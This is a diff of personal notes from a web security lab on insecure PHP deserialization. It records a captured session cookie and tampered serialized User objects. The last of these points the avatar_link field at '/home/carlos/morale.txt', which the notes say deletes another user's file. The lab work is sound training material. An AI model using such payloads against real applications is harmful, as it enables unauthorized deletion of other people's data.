@@ -90,4 +90,4 @@ PHP Fatal error:  Uncaught Exception: (DEBUG: $access_tokens[$user-&gt;username]
 
 #### Lab: Using Application Functionality to Exploit Insecure Deserialization
 * Session cookie is this: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kmihavx4auvkl1t5yputq7n241ff75ln";s:11:"avatar_link";s:19:"users/wiener/avatar";}`
-* Initial payload was `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kmihavx4auvkl1t5yputq7n241ff75ln";s:11:"avatar_link";s:23:"users/carlos/morale.txt";}` which did not work ...
+* Initial payload was `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kmihavx4auvkl1t5yputq7n241ff75ln";s:11:"avatar_link";s:23:"users/carlos/morale.txt";}` which did not work ... looking at previous labs, Carlos's home directory actually is `/home/carlos/morale.txt` so let's try `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kmihavx4auvkl1t5yputq7n241ff75ln";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}` which worked!
